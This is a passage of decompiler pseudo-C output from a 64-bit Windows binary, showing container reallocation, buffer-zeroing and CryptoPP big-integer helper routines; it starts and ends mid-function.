          (*(void (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 64))(a1, v41, v41 + 48);
          v47 = *v39;
          v48 = *a1;
          v49 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 48))(a1, v40);
          v50 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v48 + 24))(a1, v49, v47);
          sub_13F113500(v40, v50);
        }
        v39 += 3;
        --v57;
      }
      while ( v57 );
      break;
    }
    v38 = (*(__int64 (__fastcall **)(__int64 *, char *))(*a1 + 48))(a1, v72);
    sub_13F113500((__int64)v72, v38);
    v53 = ++v27;
    v10 = (_QWORD *)v71[0];
  }
  v51 = v74;
  if ( v73 < v74 )
    v51 = v73;
  v52 = (__int64)v75;
  if ( v75 )
  {
    memset(v75, 0, 8 * v51);
    sub_13F12E4D0(v52);
  }
  sub_13F1348C0((__int64)&v54);
  sub_13F135DA0(v71);
}
// 13F135930: conditional instruction was optimized away because %arg_20.4!=0
// 13F135460: using guessed type __int128 var_40[4];

//----- (000000013F135AE0) ----------------------------------------------------
__int64 __fastcall sub_13F135AE0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v4; // rbx
  _QWORD *v9; // rsi
  unsigned __int64 v10; // rdx
  __int64 result; // rax

  v4 = *(_QWORD **)a1;
  if ( *(_QWORD *)a1 )
  {
    v9 = *(_QWORD **)(a1 + 8);
    if ( v4 != v9 )
    {
      do
      {
        sub_13F134B20(v4);
        v4 += 14;
      }
      while ( v4 != v9 );
      v4 = *(_QWORD **)a1;
    }
    v10 = 112 * ((*(_QWORD *)(a1 + 16) - (_QWORD)v4) / 112i64);
    if ( v10 >= 0x1000 )
    {
      v10 += 39i64;
      if ( (unsigned __int64)v4 - *(v4 - 1) - 8 > 0x1F )
        sub_13F1682C0();
      v4 = (_QWORD *)*(v4 - 1);
    }
    sub_13F14088C(v4, v10);
  }
  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = a2 + 112 * a3;
  result = a2 + 112 * a4;
  *(_QWORD *)(a1 + 16) = result;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F135BB0) ----------------------------------------------------
__int64 __fastcall sub_13F135BB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  char *v4; // rbx
  char *v9; // rsi
  unsigned __int64 v10; // rdx
  __int64 result; // rax

  v4 = *(char **)a1;
  if ( *(_QWORD *)a1 )
  {
    v9 = *(char **)(a1 + 8);
    if ( v4 != v9 )
    {
      do
      {
        (**(void (__fastcall ***)(char *, _QWORD))v4)(v4, 0i64);
        v4 += 48;
      }
      while ( v4 != v9 );
      v4 = *(char **)a1;
    }
    v10 = 48 * ((*(_QWORD *)(a1 + 16) - (_QWORD)v4) / 48i64);
    if ( v10 >= 0x1000 )
    {
      v10 += 39i64;
      if ( (unsigned __int64)&v4[-*((_QWORD *)v4 - 1) - 8] > 0x1F )
        sub_13F1682C0();
      v4 = (char *)*((_QWORD *)v4 - 1);
    }
    sub_13F14088C(v4, v10);
  }
  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = a2 + 48 * a3;
  result = a2 + 48 * a4;
  *(_QWORD *)(a1 + 16) = result;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F135C90) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F135C90(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v4; // rbx
  unsigned __int64 result; // rax

  if ( a2 != a3 )
  {
    v4 = a2;
    do
    {
      result = sub_13F134B20(v4);
      v4 += 14;
    }
    while ( v4 != a3 );
  }
  return result;
}

//----- (000000013F135CD0) ----------------------------------------------------
__int64 __fastcall sub_13F135CD0(
        __int64 a1,
        __int64 (__fastcall ***a2)(_QWORD, _QWORD),
        __int64 (__fastcall ***a3)(_QWORD, _QWORD))
{
  __int64 (__fastcall ***v4)(_QWORD, _QWORD); // rbx
  __int64 result; // rax

  if ( a2 != a3 )
  {
    v4 = a2;
    do
    {
      result = (**v4)(v4, 0i64);
      v4 += 6;
    }
    while ( v4 != a3 );
  }
  return result;
}

//----- (000000013F135D10) ----------------------------------------------------
__int64 __fastcall sub_13F135D10(__int64 *a1, unsigned __int64 a2)
{
  __int64 v4; // rdi
  __int64 v5; // rsi

  v4 = (a1[1] - *a1) / 112;
  v5 = sub_13F136060((__int64)a1, a2);
  sub_13F135FA0((__int64)a1, *a1, a1[1], v5);
  return sub_13F135AE0((__int64)a1, v5, v4, a2);
}
// 13F135D66: ignored the value written to the shadow area of the succeeding call
// 13F135D15: ignored the value written to the shadow area of the succeeding call
// 13F135D10: ignored the value written to the shadow area of the succeeding call

//----- (000000013F135DA0) ----------------------------------------------------
void __fastcall sub_13F135DA0(__int64 *a1)
{
  __int64 v1; // rbx
  __int64 v3; // rsi
  unsigned __int64 v4; // rdx

  v1 = *a1;
  if ( *a1 )
  {
    v3 = a1[1];
    if ( v1 != v3 )
    {
      do
      {
        sub_13F135E60(v1);
        v1 += 24i64;
      }
      while ( v1 != v3 );
      v1 = *a1;
    }
    v4 = 24 * ((a1[2] - v1) / 24);
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)(v1 - *(_QWORD *)(v1 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v1 = *(_QWORD *)(v1 - 8);
    }
    sub_13F14088C(v1, v4);
    *a1 = 0i64;
    a1[1] = 0i64;
    a1[2] = 0i64;
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F135E60) ----------------------------------------------------
void __fastcall sub_13F135E60(__int64 a1)
{
  char *v1; // rbx
  char *v3; // rsi
  unsigned __int64 v4; // rdx

  v1 = *(char **)a1;
  if ( *(_QWORD *)a1 )
  {
    v3 = *(char **)(a1 + 8);
    if ( v1 != v3 )
    {
      do
      {
        (**(void (__fastcall ***)(char *, _QWORD))v1)(v1, 0i64);
        v1 += 48;
      }
      while ( v1 != v3 );
      v1 = *(char **)a1;
    }
    v4 = 48 * ((*(_QWORD *)(a1 + 16) - (_QWORD)v1) / 48i64);
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)&v1[-*((_QWORD *)v1 - 1) - 8] > 0x1F )
        sub_13F1682C0();
      v1 = (char *)*((_QWORD *)v1 - 1);
    }
    sub_13F14088C(v1, v4);
    *(_QWORD *)a1 = 0i64;
    *(_QWORD *)(a1 + 8) = 0i64;
    *(_QWORD *)(a1 + 16) = 0i64;
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F135F20) ----------------------------------------------------
__int64 __fastcall sub_13F135F20(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 i; // rbx

  for ( i = a2; i != a3; i += 112i64 )
  {
    sub_13F134610(a1, a4, i);
    a4 += 112i64;
  }
  return a4;
}

//----- (000000013F135FA0) ----------------------------------------------------
__int64 __fastcall sub_13F135FA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rbx
  __int64 result; // rax

  if ( a2 != a3 )
  {
    v6 = a2 + 96;
    do
    {
      sub_13F112A00(a4, v6 - 96);
      sub_13F112A00(a4 + 48, v6 - 48);
      *(_DWORD *)(a4 + 96) = *(_DWORD *)v6;
      *(_DWORD *)(a4 + 100) = *(_DWORD *)(v6 + 4);
      *(_DWORD *)(a4 + 104) = *(_DWORD *)(v6 + 8);
      *(_BYTE *)(a4 + 108) = *(_BYTE *)(v6 + 12);
      *(_BYTE *)(a4 + 109) = *(_BYTE *)(v6 + 13);
      *(_BYTE *)(a4 + 110) = *(_BYTE *)(v6 + 14);
      *(_BYTE *)(a4 + 111) = *(_BYTE *)(v6 + 15);
      a4 += 112i64;
      v6 += 112i64;
      result = v6 - 96;
    }
    while ( v6 - 96 != a3 );
  }
  return result;
}

//----- (000000013F136060) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F136060(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rcx

  result = 112 * a2;
  if ( a2 > 0x249249249249249i64 )
  {
    result = -1i64;
LABEL_4:
    v3 = result + 39;
    if ( result + 39 <= result )
      v3 = -1i64;
    v4 = sub_13F14059C(v3);
    v5 = v4;
    if ( !v4 )
      sub_13F1682C0();
    result = (v4 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
    *(_QWORD *)(result - 8) = v5;
    return result;
  }
  if ( result >= 0x1000 )
    goto LABEL_4;
  if ( result )
    return sub_13F14059C(112 * a2);
  return result;
}

//----- (000000013F1360D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1360D0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rcx

  result = 48 * a2;
  if ( a2 > 0x555555555555555i64 )
  {
    result = -1i64;
LABEL_4:
    v3 = result + 39;
    if ( result + 39 <= result )
      v3 = -1i64;
    v4 = sub_13F14059C(v3);
    v5 = v4;
    if ( !v4 )
      sub_13F1682C0();
    result = (v4 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
    *(_QWORD *)(result - 8) = v5;
    return result;
  }
  if ( result >= 0x1000 )
    goto LABEL_4;
  if ( result )
    return sub_13F14059C(48 * a2);
  return result;
}

//----- (000000013F136150) ----------------------------------------------------
__int64 __fastcall sub_13F136150(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rdx

  v4 = 112 * a3;
  if ( (unsigned __int64)(112 * a3) >= 0x1000 )
  {
    v4 += 39i64;
    if ( (unsigned __int64)(a2 - *(_QWORD *)(a2 - 8) - 8) > 0x1F )
      sub_13F1682C0();
    a2 = *(_QWORD *)(a2 - 8);
  }
  return sub_13F14088C(a2, v4);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F136190) ----------------------------------------------------
__int64 __fastcall sub_13F136190(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rdx

  v4 = 48 * a3;
  if ( (unsigned __int64)(48 * a3) >= 0x1000 )
  {
    v4 += 39i64;
    if ( (unsigned __int64)(a2 - *(_QWORD *)(a2 - 8) - 8) > 0x1F )
      sub_13F1682C0();
    a2 = *(_QWORD *)(a2 - 8);
  }
  return sub_13F14088C(a2, v4);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1361E0) ----------------------------------------------------
__int64 __fastcall sub_13F1361E0(__int64 a1, __int64 a2, __int64 a3)
{
  char v6; // bp
  __int64 v7; // rax
  __int64 v8; // rbx
  __int64 v9; // r14
  void (__fastcall ***v10)(_QWORD, __int64); // rcx
  void (__fastcall ***v11)(_QWORD, __int64); // rcx

  v6 = *(_BYTE *)(a1 + 16);
  v7 = sub_13F14059C(80i64);
  v8 = v7;
  if ( v7 )
  {
    *(_QWORD *)(v7 + 8) = a2;
    *(_BYTE *)(v7 + 16) = v6;
    *(_BYTE *)(v7 + 17) = 0;
    *(_QWORD *)(v7 + 24) = 0i64;
    *(_QWORD *)v7 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
    sub_13F112A00(v7 + 32, a3);
  }
  else
  {
    v8 = 0i64;
  }
  v9 = *(_QWORD *)(a1 + 8);
  *(_QWORD *)(a1 + 8) = 0i64;
  v10 = *(void (__fastcall ****)(_QWORD, __int64))(v8 + 24);
  if ( v10 )
    (**v10)(v10, 1i64);
  *(_QWORD *)(v8 + 24) = v9;
  v11 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 8);
  if ( v11 )
    (**v11)(v11, 1i64);
  *(_QWORD *)(a1 + 8) = v8;
  *(_BYTE *)(a1 + 16) = v6;
  return a1;
}
// 13F185A98: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';

//----- (000000013F1362B0) ----------------------------------------------------
__int64 __fastcall sub_13F1362B0(__int64 *a1, const __m128i *a2, __int16 *a3)
{
  __int64 v6; // rcx
  __int64 v7; // r15
  __int64 v8; // rax
  unsigned __int64 v9; // r14
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rbx
  __m128i *v13; // rsi
  const __m128i *v14; // r8
  const __m128i *v15; // rdx
  __m128i *v16; // rcx
  unsigned __int64 v17; // r8

  v6 = *a1;
  v7 = ((__int64)a2->m128i_i64 - v6) >> 1;
  v8 = (a1[1] - v6) >> 1;
  if ( v8 == 0x7FFFFFFFFFFFFFFFi64 )
    sub_13F10D1F0();
  v9 = v8 + 1;
  v10 = (a1[2] - v6) >> 1;
  v11 = v10 >> 1;
  if ( v10 <= 0x7FFFFFFFFFFFFFFFi64 - (v10 >> 1) )
  {
    v12 = v11 + v10;
    if ( v11 + v10 < v9 )
      v12 = v9;
  }
  else
  {
    v12 = v9;
  }
  v13 = (__m128i *)sub_13F139F90((__int64)a1, v12);
  v13->m128i_i16[v7] = *a3;
  v14 = (const __m128i *)a1[1];
  v15 = (const __m128i *)*a1;
  v16 = v13;
  if ( a2 == v14 )
  {
    v17 = (char *)v14 - (char *)v15;
  }
  else
  {
    sub_13F15EB00(v13, v15, (char *)a2 - (char *)v15);
    v16 = (__m128i *)&v13->m128i_i8[2 * v7 + 2];
    v17 = a1[1] - (_QWORD)a2;
    v15 = a2;
  }
  sub_13F15EB00(v16, v15, v17);
  sub_13F139C70(a1, (__int64)v13, v9, v12);
  return *a1 + 2 * v7;
}

//----- (000000013F1363C0) ----------------------------------------------------
const __m128i *__fastcall sub_13F1363C0(__int64 a1, unsigned __int64 a2, __int64 a3)
{
  _DWORD *v6; // rdx
  const __m128i *result; // rax
  unsigned __int64 v8; // r14
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rax
  __int64 v12; // r12
  unsigned __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // rax
  __m128i *v16; // rdi
  __int32 *v17; // rcx
  __int32 *v18; // r8
  unsigned __int64 v19; // rdx
  const __m128i *v20; // rcx
  unsigned __int64 v21; // rdx
  unsigned int *v22; // rcx
  unsigned __int64 i; // rbx

  v6 = *(_DWORD **)(a1 + 8);
  result = *(const __m128i **)a1;
  v8 = ((__int64)v6 - *(_QWORD *)a1) >> 2;
  v9 = (__int64)(*(_QWORD *)(a1 + 16) - *(_QWORD *)a1) >> 2;
  if ( a2 > v9 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
      sub_13F10D1F0();
    v10 = v9 >> 1;
    if ( v9 <= 0x3FFFFFFFFFFFFFFFi64 - (v9 >> 1) )
    {
      v11 = v10 + v9;
      if ( v10 + v9 < a2 )
        v11 = a2;
    }
    else
    {
      v11 = a2;
    }
    v12 = 4 * v11;
    v13 = 4 * v11;
    if ( v11 <= 0x3FFFFFFFFFFFFFFFi64 )
    {
      if ( v13 < 0x1000 )
      {
        if ( v13 )
          v16 = (__m128i *)sub_13F14059C(4 * v11);
        else
          v16 = 0i64;
LABEL_17:
        v17 = &v16->m128i_i32[v8];
        v18 = *(__int32 **)(a3 + 8);
        v19 = a2 - v8;
        if ( a2 != v8 )
        {
          do
          {
            *v17++ = *v18;
            --v19;
          }
          while ( v19 );
        }
        sub_13F15EB00(v16, *(const __m128i **)a1, *(_QWORD *)(a1 + 8) - *(_QWORD *)a1);
        v20 = *(const __m128i **)a1;
        if ( *(_QWORD *)a1 )
        {
          v21 = (*(_QWORD *)(a1 + 16) - (_QWORD)v20) & 0xFFFFFFFFFFFFFFFCui64;
          if ( v21 >= 0x1000 )
          {
            v21 += 39i64;
            if ( (unsigned __int64)v20 - v20[-1].m128i_i64[1] - 8 > 0x1F )
              sub_13F1682C0();
            v20 = (const __m128i *)v20[-1].m128i_i64[1];
          }
          sub_13F14088C(v20, v21);
        }
        *(_QWORD *)a1 = v16;
        *(_QWORD *)(a1 + 8) = (char *)v16 + 4 * a2;
        result = (__m128i *)((char *)v16 + v12);
        *(_QWORD *)(a1 + 16) = (char *)v16 + v12;
        return result;
      }
    }
    else
    {
      v13 = -1i64;
    }
    v14 = v13 + 39;
    if ( v13 + 39 <= v13 )
      v14 = -1i64;
    v15 = sub_13F14059C(v14);
    if ( !v15 )
      sub_13F1682C0();
    v16 = (__m128i *)((v15 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v16[-1].m128i_i64[1] = v15;
    goto LABEL_17;
  }
  if ( a2 <= v8 )
  {
    if ( a2 != v8 )
    {
      result = (const __m128i *)((char *)result + 4 * a2);
      *(_QWORD *)(a1 + 8) = result;
    }
  }
  else
  {
    v22 = *(unsigned int **)(a3 + 8);
    for ( i = a2 - v8; i; --i )
    {
      result = (const __m128i *)*v22;
      *v6++ = (_DWORD)result;
    }
    *(_QWORD *)(a1 + 8) = v6;
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1365C0) ----------------------------------------------------
__int64 __fastcall sub_13F1365C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  sub_13F112A00(a1, a2);
  sub_13F112A00(a1 + 48, a3);
  sub_13F112A00(a1 + 96, a4);
  *(_DWORD *)(a1 + 144) = a5;
  *(_QWORD *)(a1 + 152) = 0i64;
  *(_QWORD *)(a1 + 160) = 0i64;
  *(_QWORD *)(a1 + 168) = 0i64;
  *(_QWORD *)(a1 + 176) = 0i64;
  *(_QWORD *)(a1 + 184) = 0i64;
  sub_13F136A90(a1);
  return a1;
}

//----- (000000013F136660) ----------------------------------------------------
__int64 __fastcall sub_13F136660(__int64 **a1)
{
  __int64 *v1; // rbx
  __int64 v2; // rcx
  unsigned __int64 v3; // rdx
  __int64 result; // rax

  v1 = *a1;
  if ( *a1 )
  {
    v2 = *v1;
    if ( *v1 )
    {
      v3 = 2 * ((v1[2] - v2) >> 1);
      if ( v3 >= 0x1000 )
      {
        v3 += 39i64;
        if ( (unsigned __int64)(v2 - *(_QWORD *)(v2 - 8) - 8) > 0x1F )
          sub_13F1682C0();
        v2 = *(_QWORD *)(v2 - 8);
      }
      sub_13F14088C(v2, v3);
      *v1 = 0i64;
      v1[1] = 0i64;
      v1[2] = 0i64;
    }
    return sub_13F14088C(v1, 24i64);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1366E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1366E0(_QWORD *a1)
{
  __int64 v2; // rcx
  unsigned __int64 v3; // rdx
  __int64 v4; // rcx
  void *v5; // rdx
  __int64 v6; // rcx
  void *v7; // rdx
  __int64 v8; // rcx
  unsigned __int64 result; // rax
  void *v10; // rdx

  v2 = a1[20];
  if ( v2 )
  {
    v3 = 4 * ((a1[22] - v2) >> 2);
    if ( v3 >= 0x1000 )
    {
      v3 += 39i64;
      if ( (unsigned __int64)(v2 - *(_QWORD *)(v2 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v2 = *(_QWORD *)(v2 - 8);
    }
    sub_13F14088C(v2, v3);
    a1[20] = 0i64;
    a1[21] = 0i64;
    a1[22] = 0i64;
  }
  v4 = 15i64;
  if ( a1[14] < a1[15] )
    v4 = 14i64;
  v5 = (void *)a1[16];
  if ( v5 )
  {
    memset(v5, 0, 8i64 * a1[v4]);
    sub_13F12E4D0((__int64)v5);
  }
  v6 = 9i64;
  if ( a1[8] < a1[9] )
    v6 = 8i64;
  v7 = (void *)a1[10];
  if ( v7 )
  {
    memset(v7, 0, 8i64 * a1[v6]);
    sub_13F12E4D0((__int64)v7);
  }
  v8 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v8 = 2i64;
  v10 = (void *)a1[4];
  if ( v10 )
  {
    memset(v10, 0, 8i64 * a1[v8]);
    return sub_13F12E4D0((__int64)v10);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F136810) ----------------------------------------------------
__int64 __fastcall sub_13F136810(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // rax
  __int64 v6; // rax
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  char v10[16]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v11; // [rsp+40h] [rbp-28h]
  unsigned __int64 v12; // [rsp+48h] [rbp-20h]
  void *v13; // [rsp+50h] [rbp-18h]

  v5 = sub_13F112A00((__int64)v10, a1);
  v6 = sub_13F114170(v5, a3);
  sub_13F112A00(a2, v6);
  v7 = v12;
  if ( v11 < v12 )
    v7 = v11;
  v8 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return a2;
}
// 13F136810: using guessed type char var_38[16];

//----- (000000013F1368A0) ----------------------------------------------------
_OWORD *__fastcall sub_13F1368A0(__int128 *a1, _OWORD *a2, __int64 a3)
{
  char v4; // dl
  _OWORD *result; // rax
  __int128 v6; // [rsp+0h] [rbp-18h]

  v6 = *a1;
  if ( a3 >= 0 || *((_QWORD *)&v6 + 1) >= (unsigned __int64)-a3 )
  {
    v4 = BYTE8(v6) + a3;
    *(_QWORD *)&v6 = v6 + 4 * ((unsigned __int64)(*((_QWORD *)&v6 + 1) + a3) >> 5);
  }
  else
  {
    v4 = BYTE8(v6) + a3;
    *(_QWORD *)&v6 = -4i64 - 4 * ((unsigned __int64)~(*((_QWORD *)&v6 + 1) + a3) >> 5) + v6;
  }
  result = a2;
  *((_QWORD *)&v6 + 1) = v4 & 0x1F;
  *a2 = v6;
  return result;
}

//----- (000000013F136920) ----------------------------------------------------
__int64 __fastcall sub_13F136920(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  char v18[16]; // [rsp+38h] [rbp-79h] BYREF
  unsigned __int64 v19; // [rsp+48h] [rbp-69h]
  unsigned __int64 v20; // [rsp+50h] [rbp-61h]
  void *v21; // [rsp+58h] [rbp-59h]
  char v22[16]; // [rsp+68h] [rbp-49h] BYREF
  unsigned __int64 v23; // [rsp+78h] [rbp-39h]
  unsigned __int64 v24; // [rsp+80h] [rbp-31h]
  void *v25; // [rsp+88h] [rbp-29h]
  char v26[16]; // [rsp+98h] [rbp-19h] BYREF
  unsigned __int64 v27; // [rsp+A8h] [rbp-9h]
  unsigned __int64 v28; // [rsp+B0h] [rbp-1h]
  void *v29; // [rsp+B8h] [rbp+7h]
  char v30[9]; // [rsp+C8h] [rbp+17h] BYREF
  unsigned __int64 v31; // [rsp+D8h] [rbp+27h]
  unsigned __int64 v32; // [rsp+E0h] [rbp+2Fh]
  void *v33; // [rsp+E8h] [rbp+37h]

  sub_13F11FBB0(a4, (__int64)v30, a2);
  sub_13F1234E0(a6, (__int64)v26, (__int64)v30);
  sub_13F11FD00((__int64)v26, (__int64)v22, a5);
  sub_13F1234E0(a3, (__int64)v18, (__int64)v22);
  sub_13F120ED0((__int64)v18, a1, a2);
  v9 = v20;
  if ( v19 < v20 )
    v9 = v19;
  v10 = (__int64)v21;
  if ( v21 )
  {
    memset(v21, 0, 8 * v9);
    sub_13F12E4D0(v10);
  }
  v11 = v24;
  if ( v23 < v24 )
    v11 = v23;
  v12 = (__int64)v25;
  if ( v25 )
  {
    memset(v25, 0, 8 * v11);
    sub_13F12E4D0(v12);
  }
  v13 = v28;
  if ( v27 < v28 )
    v13 = v27;
  v14 = (__int64)v29;
  if ( v29 )
  {
    memset(v29, 0, 8 * v13);
    sub_13F12E4D0(v14);
  }
  v15 = v32;
  if ( v31 < v32 )
    v15 = v31;
  v16 = (__int64)v33;
  if ( v33 )
  {
    memset(v33, 0, 8 * v15);
    sub_13F12E4D0(v16);
  }
  return a1;
}

//----- (000000013F136A90) ----------------------------------------------------
void __fastcall sub_13F136A90(__int64 a1)
{
  __int64 v2; // rax
  unsigned __int16 *v3; // rbx
  __int64 v4; // rsi
  __int64 v5; // rdi
  int v6; // eax
  char *v7; // rcx
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  unsigned __int64 v19; // rdi
  __int64 v20; // rdx
  unsigned int v21; // edx
  __int64 v22; // rdi
  unsigned __int16 v23; // ax
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  unsigned __int64 v26; // rcx
  __int64 v27; // rdx
  __int64 v28; // r12
  unsigned int v29; // esi
  unsigned __int16 v30; // di
  unsigned int v31; // ecx
  unsigned __int16 v32; // di
  unsigned __int64 v33; // rcx
  __int64 v34; // rdx
  unsigned __int64 v35; // rcx
  __int64 v36; // rdx
  __int128 v37; // [rsp+30h] [rbp-D0h] BYREF
  __int128 v38; // [rsp+40h] [rbp-C0h] BYREF
  char v39[16]; // [rsp+50h] [rbp-B0h] BYREF
  unsigned __int64 v40; // [rsp+60h] [rbp-A0h]
  unsigned __int64 v41; // [rsp+68h] [rbp-98h]
  void *v42; // [rsp+70h] [rbp-90h]
  char v43[16]; // [rsp+80h] [rbp-80h] BYREF
  unsigned __int64 v44; // [rsp+90h] [rbp-70h]
  unsigned __int64 v45; // [rsp+98h] [rbp-68h]
  void *v46; // [rsp+A0h] [rbp-60h]
  char v47[16]; // [rsp+B0h] [rbp-50h] BYREF
  unsigned __int64 v48; // [rsp+C0h] [rbp-40h]
  unsigned __int64 v49; // [rsp+C8h] [rbp-38h]
  void *v50; // [rsp+D0h] [rbp-30h]
  char v51[16]; // [rsp+E0h] [rbp-20h] BYREF
  unsigned __int64 v52; // [rsp+F0h] [rbp-10h]
  unsigned __int64 v53; // [rsp+F8h] [rbp-8h]
  void *v54; // [rsp+100h] [rbp+0h]
  __int64 v55; // [rsp+110h] [rbp+10h]
  char v56[16]; // [rsp+118h] [rbp+18h] BYREF
  unsigned __int64 v57; // [rsp+128h] [rbp+28h]
  unsigned __int64 v58; // [rsp+130h] [rbp+30h]
  void *v59; // [rsp+138h] [rbp+38h]
  __int128 v60; // [rsp+148h] [rbp+48h] BYREF

  v55 = -2i64;
  v2 = sub_13F139590();
  v3 = *(unsigned __int16 **)v2;
  v4 = (__int64)(*(_QWORD *)(v2 + 8) - *(_QWORD *)v2) >> 1;
  sub_13F112AD0((__int64)v51, 1u);
  sub_13F11FBB0(a1 + 48, (__int64)v47, a1);
  sub_13F11D2F0((__int64)v47, (__int64)v43, a1 + 96);
  sub_13F120ED0((__int64)v43, (__int64)v39, (__int64)v51);
  v5 = sub_13F112AD0((__int64)v56, 0x8000u);
  v6 = sub_13F11C520((__int64)v39, v5);
  v7 = v39;
  if ( v6 >= 0 )
    v7 = (char *)v5;
  v8 = (unsigned int)sub_13F11C770((__int64)v7);
  v9 = v58;
  if ( v57 < v58 )
    v9 = v57;
  v10 = (__int64)v59;
  if ( v59 )
  {
    memset(v59, 0, 8 * v9);
    sub_13F12E4D0(v10);
  }
  v11 = v41;
  if ( v40 < v41 )
    v11 = v40;
  v12 = (__int64)v42;
  if ( v42 )
  {
    memset(v42, 0, 8 * v11);
    sub_13F12E4D0(v12);
  }
  v13 = v45;
  if ( v44 < v45 )
    v13 = v44;
  v14 = (__int64)v46;
  if ( v46 )
  {
    memset(v46, 0, 8 * v13);
    sub_13F12E4D0(v14);
  }
  v15 = v49;
  if ( v48 < v49 )
    v15 = v48;
  v16 = (__int64)v50;
  if ( v50 )
  {
    memset(v50, 0, 8 * v15);
    sub_13F12E4D0(v16);
  }
  v17 = v53;
  if ( v52 < v53 )
    v17 = v52;
  v18 = (__int64)v54;
  if ( v54 )
  {
    memset(v54, 0, 8 * v17);
    sub_13F12E4D0(v18);
  }
  v19 = *(_QWORD *)(a1 + 160);
  v20 = *(_QWORD *)(a1 + 184);
  if ( v20 >= 0 )
    *(_QWORD *)&v37 = v19 + 4 * ((unsigned __int64)v20 >> 5);
  else
    *(_QWORD *)&v37 = v19 - (4 * ((unsigned __int64)~v20 >> 5) + 4);
  *((_QWORD *)&v37 + 1) = v20 & 0x1F;
  v38 = v19;
  sub_13F13A040((unsigned __int64 *)(a1 + 160), &v60, &v38, &v37);
  sub_13F13A2A0((unsigned __int64 *)(a1 + 160), v8, 0);
  v21 = *(_DWORD *)(a1 + 144);
  if ( v21 )
  {
    sub_13F112AD0((__int64)v47, v21);
    sub_13F11FBB0(a1, (__int64)v51, (__int64)v47);
    sub_13F1135A0((__int64)v51, (__int64)v39, 1ui64);
    v24 = v53;
    if ( v52 < v53 )
      v24 = v52;
    v25 = (__int64)v54;
    if ( v54 )
    {
      memset(v54, 0, 8 * v24);
      sub_13F12E4D0(v25);
    }
    v26 = v49;
    if ( v48 < v49 )
      v26 = v48;
    v27 = (__int64)v50;
    if ( v50 )
    {
      memset(v50, 0, 8 * v26);
      sub_13F12E4D0(v27);
    }
    sub_13F1135A0(a1 + 96, (__int64)v43, 1ui64);
    if ( (_DWORD)v4 )
    {
      v28 = (unsigned int)v4;
      do
      {
        v29 = *v3;
        v30 = sub_13F11EEE0(a1 + 96, *v3);
        sub_13F139920((_QWORD *)(a1 + 160), v29, a1, a1 + 96, v30);
